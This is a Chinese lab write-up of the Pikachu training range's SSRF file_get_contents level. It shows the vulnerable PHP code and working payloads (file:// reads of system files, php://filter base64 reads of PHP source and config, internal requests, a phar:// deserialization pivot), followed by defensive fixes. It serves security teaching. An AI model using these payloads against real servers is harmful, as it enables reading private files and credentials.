# SSRF(file_get_content) 通关笔记

> 菜单里叫 **SSRF(file_get_content)**。
>
> 上一关是 `curl`，这一关是 `file_get_contents()`。
>
> **函数换了，但漏洞一样——而且这一关更适合"读源码"。**

---

## 一、环境与目标

| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | SSRF → SSRF(file_get_content) |
| 页面地址 | `http://pikachu/vul/ssrf/ssrf_fgc.php` |
| 提交方式 | GET |
| 参数名 | `file` |
| 目标 | 让服务器读取任意文件并返回 |

---

## 二、我的解题步骤

### 步骤 1：点页面的链接

页面上有个链接：

```
反正都读了,那就在来一首吧
```

指向：

```
ssrf_fgc.php?file=http://127.0.0.1/vul/ssrf/ssrf_info/info2.php
```

点开，显示另一首诗。

### 步骤 2：看源码

```php
//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php
//内网请求:http://x.x.x.x/xx.index
if(isset($_GET['file']) && $_GET['file'] !=null){
    $filename = $_GET['file'];
    $str = file_get_contents($filename);
    echo $str;
}
```

**作者连 payload 都写在注释里了：**

```php
//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php
```

### 步骤 3：读普通文件

```
ssrf_fgc.php?file=file:///C:/Windows/win.ini
```

**页面直接输出 win.ini 的内容。**

### 步骤 4：读 PHP 源码（关键）

直接读 PHP 文件会**被执行**（如果服务器把它当 PHP 解析）——但这里 `file_get_contents` 只是"读字节"，不会执行。

不过如果直接用 `php://filter` 的 base64 编码，可以避免内容被 HTML 解析搞乱：

```
ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php
```

我实测：

| payload | 结果 |
| --- | --- |
| `php://filter/read=convert.base64-encode/resource=ssrf.php` | **返回 base64，36148 字节** |

把返回的 base64 解码 → 得到 `ssrf.php` 的完整源码。

### 步骤 5：为什么 base64 更好

| 方式 | 问题 |
| --- | --- |
| 直接读 `.php` | 内容是纯文本，但 `<` `>` 可能被浏览器当 HTML 解析 |
| base64 编码 | 只输出 `A-Za-z0-9+/=`，不会被误解析 |

**"读源码"最稳的姿势就是 `php://filter` + base64。**

---

## 三、原理分析

### 3.1 完整链路

```
攻击者传 file 参数
      ↓
file_get_contents($filename)
      ↓
服务器去读这个路径 / 请求这个 URL
      ↓
echo $str 输出
```

### 3.2 `file_get_contents` 支持什么

| 协议 | 说明 |
| --- | --- |
| `file://` | 本地文件 |
| `http://` / `https://` | 远程请求（需要 `allow_url_fopen=On`） |
| `php://filter` | **过滤器，可编码/解码** |
| `php://input` | 请求体 |
| `data://` | 内联数据 |
| `phar://` | 归档（可触发反序列化） |

**它和 `include` 的区别：`file_get_contents` 只"读"，不"执行"。**

### 3.3 `php://filter` 的用法

```
php://filter/read=convert.base64-encode/resource=目标文件
                  ↑                     ↑
              读的时候做什么          读哪个文件
```

| 参数 | 作用 |
| --- | --- |
| `read=convert.base64-encode` | 读出来先 base64 编码 |
| `resource=xxx` | 要读的文件 |

**它能绕过"内容被 HTML 渲染搞乱"的问题。**

### 3.4 为什么这关比 curl 那关更适合读源码

| | curl | fgc |
| --- | --- | --- |
| `php://filter` | ❌ curl 不支持 | ✅ 支持 |
| `file://` | ✅ | ✅ |
| `gopher://` | ✅ | ❌ |

**想读源码，用 fgc；想打内网服务，用 curl。**

---

## 四、知识点与笔记

### 4.1 常用 payload

| 目标 | payload |
| --- | --- |
| 读文本文件 | `file:///C:/Windows/win.ini` |
| 读 PHP 源码 | `php://filter/read=convert.base64-encode/resource=index.php` |
| 内网请求 | `http://127.0.0.1/admin` |
| 读请求体 | `php://input` |
| 读配置 | `file:///D:/Pikachu/inc/config.inc.php` |

### 4.2 base64 结果怎么处理

```bash
# 复制页面输出，去掉空白，然后
echo "PD9waHAg..." | base64 -d
```

或者用 Python：

```python
import base64
print(base64.b64decode("PD9waHAg...").decode())
```

### 4.3 如果 `allow_url_fopen` 关了

```ini
allow_url_fopen = Off
```

`http://` 就失效了，但：

| 协议 | 还可用吗 |
| --- | --- |
| `file://` | ✅ |
| `php://filter` | ✅ |
| `http://` | ❌ |

**所以"读文件"这条路仍然通。**

### 4.4 更深的利用

如果 `phar://` 可用：

```
phar://上传的文件/shell.php
```

**会触发 `phar` 元数据的反序列化——从 SSRF 转成反序列化漏洞。**

---

## 五、和 curl 那关的区别

| | ssrf_curl | ssrf_fgc |
| --- | --- | --- |
| 函数 | `curl_exec()` | `file_get_contents()` |
| 参数 | `url` | `file` |
| 强项 | 打内网服务（gopher） | **读源码（php://filter）** |
| 弱项 | 不支持 `php://filter` | 不支持 `gopher://` |

**同一类漏洞，两个不同的"利用面"。**

---

## 六、防御怎么写

### 6.1 协议白名单

```php
$scheme = strtolower(parse_url($file, PHP_URL_SCHEME) ?? '');

if (!in_array($scheme, ['http', 'https'], true)) {
    exit('只允许 http/https');
}
```

**这一条就能挡住 `file://` 和 `php://`。**

### 6.2 路径白名单

```php
$allow = ['info1.php', 'info2.php'];
if (!in_array(basename($file), $allow, true)) {
    exit('非法文件');
}
```

### 6.3 不要用用户传的路径

```php
$map = [
    '1' => 'ssrf_info/info1.php',
    '2' => 'ssrf_info/info2.php',
];
$path = $map[$_GET['id']] ?? die('非法');
```

### 6.4 关闭危险 wrapper

```ini
; php.ini
allow_url_fopen = Off
allow_url_include = Off
```

**但这会破坏很多正常功能，要评估。**

---

## 七、总结

| 要点 | 内容 |
| --- | --- |
| 这关教什么 | `file_get_contents` 也能 SSRF |
| 关键代码 | `file_get_contents($_GET['file'])` |
| 读源码 | `php://filter/read=convert.base64-encode/resource=xxx` |
| 实测 | base64 输出 36148 字节 |
| 修复 | 协议白名单 + 路径映射 |

**一句话**：

> **`file_get_contents` 是"读"，`include` 是"执行"——前者拿源码，后者拿 shell。**

---

## 参考

- [OWASP: SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PHP: php:// 包装器](https://www.php.net/manual/zh/wrappers.php.php)
- [PHP: file_get_contents](https://www.php.net/manual/zh/function.file-get-contents.php)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
